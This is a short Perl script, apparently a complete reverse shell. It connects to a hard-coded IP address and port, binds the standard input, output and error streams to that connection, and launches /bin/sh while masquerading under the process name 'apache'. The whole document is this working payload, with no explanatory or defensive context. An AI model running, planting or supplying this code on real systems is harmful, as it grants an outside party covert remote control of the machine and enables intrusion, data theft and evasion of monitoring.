use Socket;
my $ip = '192.168.121.153';
my $port = 25973;
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, sockaddr_in($port,inet_aton($ip)));
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
exec({"/bin/sh"} ("apache", "-i"));